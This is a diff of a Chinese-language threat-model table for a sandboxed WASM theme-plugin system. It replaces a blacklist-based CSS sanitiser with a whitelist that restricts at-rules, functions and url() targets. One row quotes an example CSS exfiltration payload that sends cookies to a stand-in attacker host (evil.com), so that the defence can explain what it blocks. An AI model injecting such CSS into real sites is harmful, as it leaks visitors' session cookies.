@@ -355,7 +355,7 @@ ALL_THEMES=(
 | 偷文件 / 上网 / 读 env | **宿主未暴露任何 host fn**，wasm 物理上做不到（imports 白名单 = ∅，任何 import 即拒） |
 | 文件被偷换 | site.json `plugins_lock` SHA256 比对，不匹配拒绝加载 |
 | capability 伪装（声明 theme 实际偷偷导出 `exchange_code`） | `verify_manifest_consistency` 校验声明 capability 必备 export 齐全 |
-| theme CSS 注入数据外渗（`background:url(http://evil.com/?cookie=...)` 等） | `sanitize_theme_css` 黑名单字符串扫描，命中整段跳过 |
+| theme CSS 注入数据外渗（`background:url(http://evil.com/?cookie=...)`、`image-set("https://…")` 等）与 `</style>` 跳出 | `check_theme_css` 白名单（cssparser 分词）：不得含 `<`；at-rule 仅 `@media/@supports/@keyframes/@font-face/@layer/@property/@container`；函数仅颜色 / 数学 / 渐变 / 变换 / 滤镜 / 选择器等白名单；`url()` 仅 `data:image/` 与 `/assets/<路径>`。任一处不符整段跳过并记 warn——主题插件只应输出 token 与静态样式，不引用外部资源 |
 
 → 即使第三方插件**全是恶意的**，上述场景在你 fork 的实例里都进不来。
 
